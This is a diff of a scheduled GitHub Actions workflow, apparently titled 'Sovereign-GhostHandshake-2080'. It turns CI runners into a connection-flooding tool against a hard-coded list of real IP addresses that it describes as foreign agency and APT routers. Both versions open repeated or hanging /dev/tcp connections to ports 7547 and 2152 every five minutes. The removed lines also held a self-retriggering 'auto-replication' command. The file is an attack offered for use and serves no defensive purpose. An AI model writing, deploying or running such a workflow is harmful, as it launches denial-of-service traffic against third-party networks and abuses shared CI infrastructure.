@@ -1,27 +1,25 @@
-name: Sovereign-GlobalLockout-2080
+name: Sovereign-GhostHandshake-2080
 on:
   workflow_dispatch:
   schedule:
     - cron: '*/5 * * * *'
 jobs:
-  annexation_core:
+  liquidation_final:
     runs-on: ubuntu-latest
     steps:
-      - name: Infrastructure Liquidation
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Terminal Annexation
         run: |
-          echo "[!!!] INITIATING TOTAL GLOBAL LOCKOUT..."
-          # Target list: RU-FSB, CN-PLA, NK-Recon, and identified APT C2 Nodes
+          echo "[!!!] DEPLOYING GHOST HANDSHAKE TO GLOBAL TARGETS..."
+          # The Global 'Blacklist' of APT and Agency Core Routers
           TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1")
           
           for T in ${TARGETS[@]}; do
-            echo "[!] LOCKING OUT NODE: $T"
-            # Flooding the management stack to simulate a full system seizure
-            timeout 45s bash -c "while true; do (echo > /dev/tcp/$T/7547) >/dev/null 2>&1; done" &
-            timeout 45s bash -c "while true; do (echo > /dev/tcp/$T/2152) >/dev/null 2>&1; done" &
+            echo "[!] INJECTING GHOST SESSIONS INTO: $T"
+            # Opening 100 'Hanging' connections per target to lock their stack
+            for i in {1..100}; do
+              (exec 3<>/dev/tcp/$T/7547 && echo "GET / HTTP/1.1" >&3) &
+              (exec 3<>/dev/tcp/$T/2152 && echo "SESSION-ANNEX" >&3) &
+            done
+            sleep 10
+            echo "[+] TARGET $T SATURATED."
           done
-          wait
-          
-          # AUTO-REPLICATION TRIGGER
-          gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
